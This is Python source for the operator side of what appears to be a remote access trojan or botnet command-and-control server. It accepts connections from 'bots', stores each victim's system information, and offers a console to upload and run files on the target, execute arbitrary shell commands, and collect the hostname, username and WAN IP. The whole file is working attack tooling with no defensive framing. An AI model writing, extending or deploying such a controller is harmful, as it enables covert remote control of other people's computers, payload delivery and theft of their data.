import socket
import _thread
import os, time
import configparser
import requests
from urllib.request import urlopen
from .fetchinfo import *



VERSION = "V.0"
BUFFER = 1024
global client, addr
global infofilename
clist = []
iplist = []
global remote_hostname
global cip, cport
global myip, myport

config = configparser.ConfigParser()
try:
    config.read("settings.ini")
except FileNotFoundError:
    print(" Configuration file not found.")
except Exception as e:
    print(str(e))

main = config['DEFAULT']
myip = main['host']
myport = int(main['port'])


    
def Server():

    def threaded_management(sock):
        
        infofilename = "bots/" + str(remote_hostname[0]) + ".txt"
        print("[↻] Getting system information of " + str(remote_hostname[0]) + ".")
        GetINFO(client, infofilename)
        def host(ip):
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                return str(hostname)
            except:
                return "Unknown"
            

        def SendData(data):
            data = data.encode()
            try:
                sock.send(data)
            except Exception as serror:
                print("[ERROR] " + str(serror))
        
        def SendBytes(data): # Send without encoding..
            try:
                sock.send(data)
            except Exception as serror:
                print("[ERROR] " + str(serror))

        def console():
            try:
                data = input("-> ")
                msg = data.encode()
                args = data.split()

                if(data == "info"):
                    try:
                        with open(infofilename, "r+") as info:
                            data = info.read()
                            print(data)
                    except FileNotFoundError:
                        print("[-] Information does not exist.")
                        print("[^] Getting System information..")
                        GetINFO(client, infofilename)
                        print("[+] Got System information.")
                
                elif(data == "sendfile"):
                    try:
                        filename = input("[?] Filename -> ")
                        rfilename = input("[?] Filename on Target PC -> ")
                        with open(filename, "r+") as sendfile:
                            SendData("recvthis="+rfilename)
                            data = sendfile.read()
                            bufferst = os.stat(filename)
                            print("[+] File opened " + filename + " ("+str(bufferst.st_size) + " bytes)" )
                            SendData(data)
                            print("[+] File Sent.")
                    except FileNotFoundError:
                        print("[x] File not found!?")
                    except Exception as e:
                        print("[x] Error : " + str(e))
                        
                elif(data == "bsendfile"):
                    try:
                        print("(TIP : Use exec-file to Execute an Application)")
                        filename = input("[?] Binary Filename -> ")
                        rfilename = input("[?] Binary Filename on Target PC -> ")
                        with open(filename, "rb") as sendfile:
                            SendData("recvthis="+rfilename)
                            data = sendfile.read()
                            bufferst = os.stat(filename)
                            print("[+] File opened " + filename + " ("+str(bufferst.st_size) + " bytes)" )
                            SendBytes(data)
                            print("[+] File Sent.")
                    except FileNotFoundError:
                        print("[x] File not found!?")
                    except Exception as e:
                        print("[x] Error : " + str(e))

                elif(data == "exec-file"):
                    appname = input("[>] Enter Filename -> ")
                    SendData("exec="+appname)

                elif(data == "exec"):
                    command = input("[>] Enter Command -> ")
                    SendData("cmd="+command)

                elif(data == "hostname"):
                    SendData("hostname")
                
                elif(data == "username"):
                    SendData("username")

                elif(data == "msgbox"):
                    msg = input("[>] Enter Message Box Message -> ")
                    title = input("[>] Enter Message Box Title -> ")
                    SendData("msgbox="+msg+"="+title)

                elif(data == "me"):
                    print("[+] Hostname : " + socket.gethostname())
                    print("[+] Status : Online.")
                    print("[+] Bot(s) : Online.")

                elif(data == "wanip"):
                    SendData("wanip\n")

                elif(data == "help"):
                    print("""
                    Here are some commands : 
                    - sendfile - send a normal file (non-binary)
                    - bsendfile - send a binary file 
                    - kill - kill the connection
                    - info - View remote pc system information
                    - msgbox - send client a message box
                    - exec - Execute a Command on remote machine.
                    - exec-file - Execute a File on remote machine.
                    - wanip - Get Wan ip of remote machine.
                    - hostname - Get Hostname of Remote machine.
                    - username - Get Username of Remote Machine.
                    """)
                elif(data == "kill"):
                    print("[^] Killing Connection...")
                    client.close()
                    server.close()
                    print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.")
                    time.sleep(1)
                    quit()
                else:
                    print("[~] Unknown command.")
            except KeyboardInterrupt:
                print(" Keyboard Interrupt. Exit.")
                exit(True)
            except ValueError:
                exit(True)
            except EOFError:
                exit(True)


        def recv():
            ## Receive the answer of "wanip" and save it.
            try:
                data = sock.recv(BUFFER)
                data = data.decode()
                print("\r\n"+str(remote_hostname[0]) + " : " + data)
            except ConnectionAbortedError as e_one:
                print("[ERROR] "+str(e_one) + ". Exit.")
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e_one)+")")
                time.sleep(1)
                quit()
                

            except ConnectionRefusedError as e_two:
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected. ("+str(e_two)+")")
                time.sleep(1)
                quit()
                

            except ConnectionResetError as e_three:
                print("[ERROR] " + str(e_three) + ". Exit.")
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e_three)+")")
                time.sleep(1)
                quit()
                

            except Exception as e:
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e)+")")
                time.sleep(1)
                quit()
                

        while(True):
            console()
            _thread.start_new_thread(recv, ())
            

    def run_():
        _thread.start_new_thread(threaded_management, (client,))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

    try:
        server.bind((myip, myport))
    except Exception as i:
        raise i

    try:
        server.listen(5)
        print("[+] Waiting for Incoming Connections (" + myip + ":" + str(myport) + ").")
    except KeyboardInterrupt:
        print(" Keyboard Interrupt, Exit.")
        exit()
    except Exception as errunknown:
        print(str(errunknown))
        
    while(True):
        try:
            client, addr = server.accept()
        except KeyboardInterrupt:
            print(" Keyboard Interrupt, Exit.")
            exit()
            # Change name of exception add to todo list
        except Exception as errwhat:
            print(str(errwhat))

        cip =  str(addr[0]) 
        cport = str(addr[1])
        print("[+] Connection from ", cip+":"+cport + " ( " + myip + ":" + str(myport) + " ⇆ " + cip+":"+cport + " )")
        try:
            remote_hostname = socket.gethostbyaddr(cip)
        except:
            remote_hostname = "[UNKNOWN]"
        
        print("[+] HOST " + str(remote_hostname[0]) + " has connected.")
        clist.append(client)
        iplist.append(addr[0])
        try:
            run_()
        except KeyboardInterrupt:
            print(" Keyboard Interrupt. Exit.")
            exit(True)
        except Exception as ie:
            print("[ERROR] " + str(ie) + ". Type list-all to view Clients.")
            pass